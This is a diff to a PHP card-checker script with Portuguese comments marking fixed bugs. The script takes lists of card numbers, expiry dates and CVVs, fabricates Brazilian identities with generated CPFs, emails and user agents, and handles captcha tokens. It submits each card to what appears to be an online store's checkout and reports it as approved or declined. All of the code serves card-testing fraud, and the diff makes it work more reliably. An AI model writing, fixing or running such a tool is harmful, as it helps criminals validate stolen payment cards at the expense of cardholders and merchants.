@@ -82,6 +82,11 @@ function multiexplode($delimiters, $string) {
     return explode($delimiters[0], $one);
 }
 
+// ======================== FORMATAR CPF ========================
+function formatarCPF($cpf) {
+    return substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
+}
+
 // ======================== GERAR CPF VÁLIDO ========================
 function gerarCPF() {
     $cpf = '';
@@ -113,8 +118,15 @@ function gerarCPF() {
 // Configurar header JSON PRIMEIRO (antes de qualquer output)
 header('Content-Type: application/json; charset=utf-8');
 
-// Aceitar via GET, POST ou CLI
-$lista = isset($_GET['lista']) ? strval($_GET['lista']) : (isset($_POST['lista']) ? strval($_POST['lista']) : ($argv[1] ?? ''));
+// Aceitar via GET, POST ou CLI com URL decode (ERRO #2 CORRIGIDO)
+$lista = '';
+if (isset($_GET['lista'])) {
+    $lista = urldecode(strval($_GET['lista']));
+} elseif (isset($_POST['lista'])) {
+    $lista = urldecode(strval($_POST['lista']));
+} elseif (isset($argv[1])) {
+    $lista = strval($argv[1]);
+}
 
 // Se não houver dados, retornar JSON
 if (empty($lista)) {
@@ -153,12 +165,19 @@ $cc2 = substr($cc, 4, 4);
 $cc3 = substr($cc, 8, 4);
 $cc4 = substr($cc, 12, 4);
 
-// Define bandeira
+// Define bandeira (ERRO #4 CORRIGIDO - removida opção de '2' como MasterCard)
 $bandeira = 'unknown';
 $primeiro = substr($cc, 0, 1);
-if ($primeiro == 4) $bandeira = 'visa';
-elseif ($primeiro == 5 || $primeiro == 2) $bandeira = 'mastercard';
-elseif ($primeiro == 3) $bandeira = 'amex';
+if ($primeiro == 4) {
+    $bandeira = 'visa';
+} elseif ($primeiro == 5) {
+    $bandeira = 'mastercard';
+} elseif ($primeiro == 3) {
+    $bandeira = 'amex';
+} else {
+    // Cartões começando com 2 e outros não são padrão
+    $bandeira = 'outros';
+}
 
 // ======================== DADOS PARA TESTE ========================
 $nomes = ['Carlos', 'João', 'Maria', 'Paulo', 'Ana', 'Lucas', 'Bruna', 'Rafael', 'Camila', 'Roberto'];
@@ -169,10 +188,18 @@ $sobrenome = $sobrenomes[array_rand($sobrenomes)];
 $email = strtolower($nome . $sobrenome . rand(1, 99) . '@gmail.com');
 $userAgent = gerarUserAgent();
 $uuid = generateUUID();
-$cpf = gerarCPF();
+$cpf_raw = gerarCPF();
+$cpf = formatarCPF($cpf_raw); // ERRO #3 CORRIGIDO - CPF formatado
 
 // ======================== CAPTCHA ========================
-$token = isset($_GET['token']) ? strval($_GET['token']) : (isset($_POST['token']) ? strval($_POST['token']) : ($argv[2] ?? null));
+$token = '';
+if (isset($_GET['token'])) {
+    $token = urldecode(strval($_GET['token']));
+} elseif (isset($_POST['token'])) {
+    $token = urldecode(strval($_POST['token']));
+} elseif (isset($argv[2])) {
+    $token = strval($argv[2]);
+}
 
 // Validar e resolver token automaticamente (STDERR para não quebrar JSON)
 if (empty($token)) {
@@ -341,7 +368,7 @@ curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
     'billing_first_name' => $nome,
     'billing_last_name' => $sobrenome,
-    'billing_cpf' => $cpf,
+    'billing_cpf' => $cpf_raw, // Enviar CPF sem formatação para o servidor
     'billing_country' => 'BR',
     'billing_postcode' => '83322-450',
     'billing_address_1' => 'Rua Todos os Santos',
@@ -383,7 +410,28 @@ if (!$response) {
 } else {
     $json = json_decode($response, true);
     
-    if ($json !== null && isset($json['result']) && $json['result'] === 'success') {
+    // ERRO #6 CORRIGIDO - Tratamento melhorado de respostas HTML
+    if ($json === null) {
+        // Se não conseguir decodificar como JSON, é provável que seja HTML de erro
+        $isHtml = (stripos($response, '<!DOCTYPE') !== false || stripos($response, '<html') !== false);
+        if ($isHtml) {
+            fwrite(STDERR, "❌ Erro: Servidor retornou HTML em vez de JSON\n");
+            fwrite(STDERR, "Status HTTP: $httpCode\n");
+            $resultado = [
+                'status' => 'erro',
+                'mensagem' => 'Servidor retornou erro HTML. Status: ' . $httpCode,
+                'cartao' => "$cc|$mes|$ano|$cvv",
+                'http_status' => $httpCode
+            ];
+        } else {
+            $resultado = [
+                'status' => 'erro',
+                'mensagem' => 'Resposta inválida do servidor',
+                'cartao' => "$cc|$mes|$ano|$cvv",
+                'http_status' => $httpCode
+            ];
+        }
+    } elseif (isset($json['result']) && $json['result'] === 'success') {
         $resultado = [
             'status' => 'aprovada',
             'mensagem' => 'Cartão aprovado com sucesso',
@@ -397,7 +445,7 @@ if (!$response) {
         fwrite(STDERR, "   CPF: $cpf\n");
         fwrite(STDERR, "   HTTP Status: $httpCode\n");
     } else {
-        $msg = ($json !== null && isset($json['messages'])) ? strip_tags($json['messages']) : 'Erro desconhecido';
+        $msg = isset($json['messages']) ? strip_tags($json['messages']) : 'Erro desconhecido';
         $resultado = [
             'status' => 'reprovada',
             'mensagem' => $msg,
